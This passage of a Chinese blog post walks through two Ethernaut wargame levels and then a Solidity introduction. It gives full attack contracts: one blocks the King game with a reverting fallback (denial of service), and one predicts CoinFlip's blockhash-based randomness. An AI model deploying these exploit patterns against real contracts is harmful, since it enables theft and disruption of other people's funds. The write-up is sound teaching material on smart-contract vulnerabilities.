<p><strong>3c4308a8</strong>是multiply函式的 <strong>signature</strong>，是取函数名称和参数类型进行哈希后取前四个byte而得（不包含 <code>0x</code> ）：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sha3(&quot;multiply(int256,int256)&quot;));</span><br><span class="line">//0x3c4308a8851ef99b4bfa5ffd64b68e5f2b4307725b25ad0d14040bdb81e3bafcsha3(&quot;multiply(int256,int256)&quot;)).substr(2,8);</span><br><span class="line">//3c4308a8</span><br></pre></td></tr></table></figure>

<p>EVM就是靠函式的signature来知道该执行哪个函式的。在合约编译完的bytecode里搜寻也能找到此signature。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233106.jpg" alt="img"></p>
<p>\6. DoS拒绝服务攻击</p>
<p>拒绝服务攻击。</p>
<p>这里参看Ethernaut的第九关，king。</p>
<p>合约代码逻辑很简单，谁给的钱多谁就能成为 King，并且将前任 King 付的钱归还。当提交 instance 时，题目会重新夺回 King 的位置，需要解题者阻止其他人成为 King。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233107.jpg" alt="img"></p>
<p>然后提交一些币。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233108.jpg" alt="img"></p>
<p>回顾一下 Solidity 中几种转币方式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.transfer()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会 <code>throw;</code> 回滚状态</li>
<li>只会传递部分 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.send()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会返回 false</li>
<li>只会传递部分 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.call.value()()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会返回 false</li>
<li>传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）</li>
</ul>
<p>当我们成为 King 之后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 <code>transfer()</code>。上面提到，当 <code>transfer()</code> 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，代码将无法继续向下运行，其他人就无法成为新的 King。</p>
<p>部署一个新的合约，当收到转账时主动抛出错误。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line"></span><br><span class="line">    function Attack() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        instance_address.call.value(1.1 ether)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>\7. Bad Randomness - 可预测的随机处理</p>
<p>伪随机问题一直都存在于现代计算机系统中，但是在开放的区块链中，像在以太坊智能合约中编写的基于随机数的处理逻辑感觉就有点不切实际了，由于人人都能访问链上数据，合约中的存储数据都能在链上查询分析得到。如果合约代码没有严格考虑到链上数据公开的问题去使用随机数，可能会被攻击者恶意利用来进行 “作弊”。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件</p>
<ul>
<li>连续猜对 10 次</li>
</ul>
<p><code>FACTOR</code> 为 2^255，<code>coinFlip</code> 结果只会为 1 或 0<br>相当于一个猜硬币正反面的游戏</p>
<p>这是经典的区块链伪随机数的问题。<br>在以太坊智能合约中编写的基于随机数的处理逻辑是十分危险的，因为区块链上的数据是公开的，所有人都可以看见，利用公开的数据来生成随机数是不明智的。<br>此外，像 <code>timestamps</code> 这样矿工可控的数据也不宜作为种子。</p>
<p>在这道题中，出题人利用 <code>block.blockhash(block.number-1)</code> 来生成随机数，这是可预测的。我们可以部署一个新的合约，先进行随机数的预测，再进行竞猜。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  CoinFlip fliphack;</span><br><span class="line">  address instance_address = instance_address_here;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function Attack() &#123;</span><br><span class="line">    fliphack = CoinFlip(instance_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function predict() public view returns (bool)&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    return coinFlip == 1 ? true : false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    bool guess = predict();</span><br><span class="line">    fliphack.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需调用 10 次 <code>hack()</code> 函数即可。</p>
<p>P.S.</p>
<ol>
<li>遇上了meatamask 无限转圈的问题，最后发现是版本问题，下载一个老版本就行。但是extension store没有老版本，后来还是github上发现，在chrome:&#x2F;&#x2F;extensions右上角打开开发者模式，然后可以选择文件夹。</li>
</ol>
<p><strong>参考：</strong></p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md">https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/TurkeyCock/article/details/80485391">以太坊交易源码分析 - 鑫鑫点灯 - CSDN博客</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/148341">https://www.anquanke.com/post/id/148341</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.colabug.com/4089704.html">Ethernaut Lvl 0 Walkthrough: ABIs, Web3, and how to abuse them</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/ajian1984/articles/32320">干货 | Solidity 安全：已知攻击方法和常见防御模式综合列表，Part-1：可重入漏洞、算法上下溢出</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/632/">Solidity 安全：已知攻击方法和常见防御模式综合列表</a></li>
<li><a href="https://link.zhihu.com/?target=http://www.cnblogs.com/iamstudy/articles/ethernaut_game_wp_1.html">智能合约 - Ethernaut Game（上）</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/trufflesuite/truffle-contract%23sending-ether--triggering-the-fallback-function">trufflesuite&#x2F;truffle-contract</a></li>
<li><a href="https://link.zhihu.com/?target=http://orchome.com/966">以太坊ABI介绍 - OrcHome</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2018/08/09/understand-abi/">如何理解以太坊ABI - 应用程序二进制接口</a></li>
<li><a href="https://link.zhihu.com/?target=http://remix.ethereum.org/%23optimize=true&version=soljson-v0.4.25+commit.59dbf8f1.js">http://remix.ethereum.org/#optimize=true&version=soljson-v0.4.25+commit.59dbf8f1.js</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/304b99bfef3d">metamask 无限转圈 loading</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/601/">以太坊智能合约安全入门了解一下（上）</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/607/">以太坊智能合约安全入门了解一下（下）</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall">Difference between CALL, CALLCODE and DELEGATECALL</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/how-to-build-updateable-smart-contract-part-1">教程 | 在区块链上建立可更新的智慧合约(一)</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/152590">Solidity中的delegatecall杂谈 - 安全客，安全资讯平台</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.bubbles966.cn/blog/2018/05/07/analyse_dapp_by_ethernaut_2/">从Ethernaut学习智能合约审计(二) - Bubbles~blog</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834">https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834</a></li>
</ol>
<h1 id="区块链技术14-智能合约和solidity简介"><a href="#区块链技术14-智能合约和solidity简介" class="headerlink" title="区块链技术14:智能合约和solidity简介"></a>区块链技术14:智能合约和solidity简介</h1><p>首先要强调的是，以太坊和比特币的区别。比特币主要用途是用于进行交易，定位是数字货币的支付功能。以太坊相比比特币是一个巨大的提升，将区块链的应用边界从货币和支付扩大到了更广的领域（通过智能合约实现）。</p>
<p>区块链2.0是更宏观的对整个市场去中心化，利用区块链技术来转换许多不同的数字资产，通过转让来创建不同资产的价值。区块链技术的去中心化账本功能可以被用来创建、确认、转移各种不同类型的资产及合约。几乎所有类型的金融交易都可以被改造成在区块链上使用，包括股票、私募股权、众筹、债券和其他类型的金融衍生品如期货、期权等。</p>
<p>那什么是智能合约呢？</p>
<p>智能合约不是一定要用区块链来实现，很久之前就已经出现了：比如微信和支付宝的信用卡自动还款，也是一种智能合约。当还款日到了，还款条件也满足（支付宝的余额宝、微信支付余额或者银行储蓄卡中余额充足），系统会自动进行还款，这些都是智能合约，也没有使用区块链技术。</p>
<p>而使用区块链的话，结合不可篡改数据无法删除、修改，只能新增，保证了历史的可追溯，同时作恶的成本将很高，因为其作恶行为将被永远记录，同时拥有高可靠性，用户不用担心系统在条件被满足时不执行合约；然后就是去中心化带来的全网备份，完备的记录完全可以支持支持事后的审计，避免了中心化因素的影响。所以可以想象，以太坊通过在区块链上提供了图灵完备语言，打开了多么大的一个市场。</p>
<p>举一个例子，看看以太坊上的应用：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233109.jpg" alt="img"></p>
<p>谜恋猫是世界首款区块链游戏。“区块链”是支持类似比特币这样的加密货币的运作技术基础。尽管谜恋猫不是数字货币，但它也能提供同样的安全保障：每一只谜恋猫都是独一无二的，而且100%归用户所有。它无法被复制、拿走、或销毁。</p>
<p>迷恋猫官方将他们设计的迷恋猫合约发布到了以太坊上，并公布了合约内容，其中规定了0代猫只能有他们的CEO、COO来产生，并限定的0代猫最多产生的数量，以及玩家之间如何交易猫，两只猫咪之间如何繁育、猫咪备孕周期等等规则，以上规则已经在以太坊上做了公证，以后只能按照这套规则来进行游戏。<br>在区块链平台上的每只猫咪其实只是存在以太坊中的一段猫咪基因编码，该段基因编码决定了猫咪的属性、外貌等，迷恋猫官方在以太坊之外，提供了一个网站，在网站上将这些猫咪根据其基因编码展示出来。玩家可以使用自己的以太坊帐户去购买这些猫咪，并将自己的猫咪去与其他玩家的猫咪繁育以产生下一代猫咪，或者继续将其拍卖，猫咪之间繁育之后产生的下一代猫咪，其基因编码是受其两只上一代猫咪基因编码影响的，由于猫咪的基因编码在以太坊上都是公开的，所以迷恋猫官方并未公布下一代基因编码的生成规则，这样玩家也无法人为的控制，使用两只特定基因的猫来繁育出具有特定稀有属性的下一代。 玩家在以太坊的帐户是由一段特殊的密钥保护的，玩家进行购买猫咪、繁育猫咪操作事，这些操作信息都会被发布到以太坊上时，并且这些操作行为都会使用玩家的密钥进行认证，并在以太坊上记录，其公之于众。所以所有人都可以看到玩家A买了一只猫咪Kitty101，玩家B将他的猫咪Kitty201与他的Kitty202进行了繁育，并生下了一只什么样基因的Kitty301。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233110.jpg" alt="img"></p>
<p>在此之后，区块链上发布了不少游戏，而今年暑假的两款游戏（Fomo3d和LastWinner）吸引了大量的眼球，同时也可能预示着在以太坊上游戏开发的没落。Fomo3d的黑客攻击技巧可以参看<a href="https://link.zhihu.com/?target=https://wallstreetcn.com/articles/3393395">1</a>和<a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/4c926fbbdafd">2</a>。</p>
<p>那由此可以看到，比太币和以太坊底层框架本身，当前攻击较少；但是在以太坊上，智能合约本身的代码问题是安全的重灾区。</p>
<p>那接下来，我们讨论下，solodity语言，对智能合约有一个基本的了解。</p>
<p>我们使用在线的<a href="https://link.zhihu.com/?target=http://remix.ethereum.org/">remix IDE</a>来查看智能合约的效果。</p>
<p>首先看最基本的语法和使用情况。</p>
<ol>
<li>test_2.sol 最基本的用法</li>
</ol>
<p>以下的代码中，除了第一行和第二行中的contract，其实就和其他我们比较熟悉的语言差不多。将代码拷贝到remix之中，然后deploy到链上去，就是智能合约了。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract C &#123;</span><br><span class="line">    //交换传入值的顺序并返回</span><br><span class="line">    function f(uint key, uint value) returns (uint, uint)&#123; </span><br><span class="line">        return (value, key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function g() public view returns (uint, uint)&#123;</span><br><span class="line">        //任意顺序的通过变量名来指定参数值</span><br><span class="line">        return f(&#123;value: 2, key: 1&#125;);//2,1</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function h() public view returns (uint)&#123;</span><br><span class="line">        uint a = 3;</span><br><span class="line">        uint b = 4;</span><br><span class="line">        return a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233111.jpg" alt="img"></p>
<p>第一行就是告诉大家源代码使用Solidity版本0.4.0写的，并且使用0.4.0以上版本运行也没问题（最高到0.5.0，但是不包含0.5.0）。这是为了确保合约不会在新的编译器版本中突然行为异常。关键字 <code>pragma</code> 的含义是，一般来说，pragmas（编译指令）是告知编译器如何处理源代码的指令的（例如， <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Pragma_once">pragma once</a> ）。</p>
<p>Solidity中合约的含义就是一组代码（它的 <em>函数</em> )和数据（它的 <em>状态</em> ），它们位于以太坊区块链的一个特定地址上。 </p>
<p>这个合约中有三个函数，f逆序返回参数中的两个值；g调用f；h计算两个数字的和。</p>
<ol start="2">
<li>存储</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line"></span><br><span class="line">    function set(uint x) public &#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码行 <code>uint</code> <code>storedData;</code> 声明一个类型为 <code>uint</code> (256位无符号整数）的状态变量，叫做 <code>storedData</code> 。 你可以认为它是数据库里的一个位置，可以通过调用管理数据库代码的函数进行查询和变更。对于以太坊来说，上述的合约就是拥有合约（owning contract）。在这种情况下，函数 <code>set</code> 和 <code>get</code> 可以用来变更或取出变量的值。</p>
<p>要访问一个状态变量，并不需要像 <code>this.</code> 这样的前缀，虽然这是其他语言常见的做法。</p>
<p>该合约能完成的事情并不多（由于以太坊构建的基础架构的原因）：它能允许任何人在合约中存储一个单独的数字，并且这个数字可以被世界上任何人访问，且没有可行的办法阻止你发布这个数字。当然，任何人都可以再次调用 <code>set</code> ，传入不同的值，覆盖你的数字，但是这个数字仍会被存储在区块链的历史记录中。随后，我们会看到怎样施加访问限制，以确保只有你才能改变这个数字。</p>
<ol start="3">
<li>以上是单个合约。那我们来试一下在不同的合约之中进行交互。(test_<em>send.sol和simple_set.sol</em>)</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">//import &#x27;test_send.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line">    function set(uint x) public&#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line">    function get() public constant returns (uint retVal) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleSet &#123;</span><br><span class="line"></span><br><span class="line">	address instance_address = 0x9351ca1b4cc9c3d11db77374de3987b5abf3d4c8;</span><br><span class="line">	SimpleStorage target = SimpleStorage(instance_address);</span><br><span class="line">    uint readData;</span><br><span class="line">	</span><br><span class="line">    function read() public view returns (uint) &#123;</span><br><span class="line">        readData = target.get();</span><br><span class="line">		return readData;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    function write(uint x) &#123;</span><br><span class="line">        target.set(x));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在simple_set中，可以调用并修改另外一个合约中的数据。下图展示的是先通过simple_set修改storeData的值，然后在simpleStorage中去读取，结果显示了变化。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233112.jpg" alt="img"></p>
<ol start="4">
<li>铸币(coin_mint.sol)</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line"></span><br><span class="line">//关键字“public”使变量能从合约外部访问。</span><br><span class="line">    address public minter;</span><br><span class="line">    mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">//事件让轻客户端能高效的对变化做出反应。</span><br><span class="line">    event Sent(address from, address to, uint amount);</span><br><span class="line"></span><br><span class="line">//这个构造函数的代码仅仅只在合约创建的时候被运行。</span><br><span class="line">    function Coin() &#123;</span><br><span class="line">        minter = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function mint(address receiver, uint amount) &#123;</span><br><span class="line">        if (msg.sender != minter) return;</span><br><span class="line">        balances[receiver] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">    function send(address receiver, uint amount) &#123;</span><br><span class="line">        if (balances[msg.sender] &lt; amount) return;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[receiver] += amount;</span><br><span class="line">        Sent(msg.sender, receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个合约引入了一些新的概念，让我们逐一解读。</p>
<p><code>address</code> <code>public</code> <code>minter;</code> 这一行声明了一个可以被公开访问的 <code>address</code> 类型的状态变量。 <code>address</code> 类型是一个160位的值，且不允许任何算数操作。这种类型适合存储合约地址或外部人员的密钥对。关键字 <code>public</code> 自动生成一个函数，允许你在这个合约之外访问这个状态变量的当前值。如果没有这个关键字，其他的合约没有办法访问这个变量。由编译器生成的函数的代码大致如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">function minter() returns (address) &#123; return minter; &#125;</span><br></pre></td></tr></table></figure>

<p>当然，加一个和上面完全一样的函数是行不通的，因为我们会有同名的一个函数和一个变量，这里，主要是希望你能明白——编译器已经帮你实现了。</p>
<p>下一行， </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">mapping (address =&gt; uint) public balances; </span><br></pre></td></tr></table></figure>

<p>也创建一个公共状态变量，但它是一个更复杂的数据类型。 该类型将address映射为无符号整数。 Mappings 可以看作是一个 <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Hash_table">哈希表</a> 它会执行虚拟初始化，以使所有可能存在的键都映射到一个字节表示为全零的值。 但是，这种类比并不太恰当，因为它既不能获得映射的所有键的列表，也不能获得所有值的列表。 因此，要么记住你添加到mapping中的数据（使用列表或更高级的数据类型会更好），要么在不需要键列表或值列表的上下文中使用它，就如本例。 而由 <code>public</code> 关键字创建的getter函数 <a href="https://link.zhihu.com/?target=https://solidity-cn.readthedocs.io/zh/develop/contracts.html%23getter-functions">getter function</a> 则是更复杂一些的情况， 它大致如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">function balances(address _account) public view returns (uint) &#123; return balances[_account]; &#125;</span><br></pre></td></tr></table></figure>

<p>正如你所看到的，你可以通过该函数轻松地查询到账户的余额。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">event Sent(address from, address to, uint amount); </span><br></pre></td></tr></table></figure>

<p>这行声明了一个所谓的“事件（event）”，它会在 <code>send</code> 函数的最后一行被发出。用户界面（当然也包括服务器应用程序）可以监听区块链上正在发送的事件，而不会花费太多成本。一旦它被发出，监听该事件的listener都将收到通知。而所有的事件都包含了 <code>from</code> ， <code>to</code> 和 <code>amount</code> 三个参数，可方便追踪事务。 为了监听这个事件，你可以使用如下代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Coin.Sent().watch(&#123;&#125;, &#x27;&#x27;, function(error, result) &#123;</span><br><span class="line">    if (!error) &#123;</span><br><span class="line">        console.log(&quot;Coin transfer: &quot; + result.args.amount +</span><br><span class="line">            &quot; coins were sent from &quot; + result.args.from +</span><br><span class="line">            &quot; to &quot; + result.args.to + &quot;.&quot;);</span><br><span class="line">        console.log(&quot;Balances now:\n&quot; +</span><br><span class="line">            &quot;Sender: &quot; + Coin.balances.call(result.args.from) +</span><br><span class="line">            &quot;Receiver: &quot; + Coin.balances.call(result.args.to));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里请注意自动生成的 <code>balances</code> 函数是如何从用户界面调用的。</p>
<p>特殊函数 <code>Coin</code> 是在创建合约期间运行的构造函数，不能在事后调用。 它永久存储创建合约的人的地址: <code>msg</code> (以及 <code>tx</code> 和 <code>block</code> ) 是一个神奇的全局变量，其中包含一些允许访问区块链的属性。 <code>msg.sender</code> 始终是当前（外部）函数调用的来源地址。</p>
<p>最后，真正被用户或其他合约所调用的，以完成本合约功能的方法是 <code>mint</code> 和 <code>send</code>。 如果 <code>mint</code> 被合约创建者外的其他人调用则什么也不会发生。 另一方面， <code>send</code> 函数可被任何人用于向他人发送币 (当然，前提是发送者拥有这些币)。记住，如果你使用合约发送币给一个地址，当你在区块链浏览器上查看该地址时是看不到任何相关信息的。因为，实际上你发送币和更改余额的信息仅仅存储在特定合约的数据存储器中。通过使用事件，你可以非常简单地为你的新币创建一个“区块链浏览器”来追踪交易和余额。</p>
<p>这份合约进行操作，譬如通过账户7578C将合约部署到链上，那么可以查看合约的minter；minter可以自己铸币，相当于是发给任何用户一些币；有币的用户又可以进行转账。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233113.jpg" alt="img"></p>
<ol start="5">
<li>复杂的数据类型 （origin_send.sol）</li>
</ol>
<p>msg.sender和tx.origin</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Demo2&#123;</span><br><span class="line">    Demo demo222;</span><br><span class="line">    function Demo2(address aimAddr) &#123;</span><br><span class="line">        demo222 = Demo(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        demo222.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tx.origin</code>是一个address类型，表示交易的发送者，<code>msg.sender</code>则表示为消息的发送者。在同一个合约中，他们是等价的。但是在不同合约中，<code>tx.origin</code>表示用户地址，<code>msg.sender</code>则表示合约地址。</p>
<p>上述代码中有两个合约，需要分别部署。并且demo2在部署时需要传入参数。</p>
<p>在demo中:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233115.jpg" alt="img"></p>
<p>在demo2中，</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233116.jpg" alt="img"></p>
<p>而下面的地址7578就是demo合约部署的地址，7D5b就是demo2合约部署的地址。</p>
<p>使用<code>msg.sender</code>的所有者可能是一个合约。</p>
<p>使用<code>tx.origin</code>的所有者永远不可能是合约。</p>
<p>在简单的调用链A-&gt; B-&gt; C-&gt; D中，内部D 的<code>msg.sender</code>为C，<code>tx.origin</code>为A.</p>
<p>就灵活性而言首选<code>msg.sender</code>。此外，对于Serenity，Vitalik建议避免使用tx.origin：<a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof">How do I make my DAPP “Serenity-Proof?”</a></p>
<p>如果你真的需要使用<code>tx.origin</code>，请一定考虑仔细。请记住，你可能不是该合约的唯一用户。其他人也可能想要使用你的合约，并希望通过他们编写的合约与之进行互动。</p>
<p>如果在D中确实需要其来源<code>origin</code>，那么合约B，C，D中的每个函数都可以采用额外的参数来传播来源：A将其地址（<code>this</code>）传递给B，B将值传递给C ，C将它传递给D.</p>
<p>可以查看参考5， 讨论使用tx.origin可能会引起的攻击。</p>
<p>接下来看一下address。</p>
<p>以太坊中的地址的长度为<code>20</code>字节，一字节等于8位，一共<code>160</code>位，所以<code>address</code>其实亦可以用<code>uint160</code>来声明。</p>
<p>属性：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>.balance, 地址的余额（单位为：wei）</span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>.transfer,发送以太币（单位为：wei）到一个地址，如果失败会停止并抛出异常。</span><br></pre></td></tr></table></figure>









<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://wallstreetcn.com/articles/3393395">Fomo3D 千万大奖获得者“特殊攻击技巧”最全揭露 - 华尔街见闻</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/4c926fbbdafd">“首次深度揭秘”Fomo3D，被黑客拿走的2200万！</a></li>
<li><a href="https://link.zhihu.com/?target=https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html">https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html">https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html</a></li>
